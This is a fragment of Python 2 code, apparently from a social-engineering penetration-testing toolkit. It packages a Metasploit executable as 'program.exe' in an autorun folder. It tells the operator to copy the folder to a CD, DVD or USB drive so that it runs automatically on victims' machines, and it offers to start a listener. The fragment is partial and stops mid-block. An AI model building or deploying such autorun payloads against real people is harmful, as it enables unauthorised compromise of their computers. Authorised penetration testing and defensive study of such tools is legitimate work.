...
if os.path.isfile("src/program_junk/standardpayload.file"):
    trigger = 1
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;mv src/html/msf.exe autorun/program.exe", shell=True).wait()
...
filewrite.close()
print '   [*] Your attack has been created in the SET home directory folder "autorun"'
print '   [*] Copy the contents of the folder to a CD/DVD/USB to autorun.'

# if we are doing the custom pdf
if trigger == 2 or trigger == 3:
    choice1 = raw_input("\n\n   Do you want to create a listener right now yes or no: ")
    if choice1 == "yes" or choice1 == "y" or choice1 == "":
